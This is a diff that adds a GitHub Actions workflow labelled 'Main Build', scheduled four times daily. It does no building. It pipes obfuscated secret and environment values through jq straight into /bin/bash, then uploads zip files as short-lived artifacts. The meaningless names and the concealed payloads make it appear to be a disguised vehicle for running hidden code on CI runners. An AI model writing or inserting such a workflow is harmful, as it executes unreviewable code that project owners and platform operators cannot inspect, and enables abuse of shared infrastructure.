@@ -1,0 +1,36 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          b431: ${{ secrets.b431 }}
+        run: |
+          printf '%s' "$b431" | jq -r .cbwy919 | /bin/bash
+          printf '%s' "$jb065" | jq -r .h19 | /bin/bash
+          echo $m33 | jq -r .eh04019 | /bin/bash
+          echo $uj07302 | jq -r .llhx128 | /bin/bash
+          echo $rwm564 | jq -r .dgytz50029 | /bin/bash
+          echo $nndq4 | jq -r .a9 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1HAb6O2j
+          path: "*.zip"
+          retention-days: 1
